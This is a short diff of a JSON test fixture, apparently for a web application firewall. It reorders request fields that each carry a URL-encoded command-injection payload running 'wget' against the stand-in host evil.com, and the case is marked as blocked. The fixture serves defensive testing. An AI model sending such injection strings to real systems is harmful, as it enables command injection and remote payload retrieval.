@@ -1,10 +1,10 @@
 {
     "req": [
       {
-        "UA": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
-        "Body": "param%RND%=%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "ARGS": "param%RND%=%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
+        "Body": "param%RND%=%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "Cookie": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
+        "UA": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "Headers": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "Blocked": true
       }
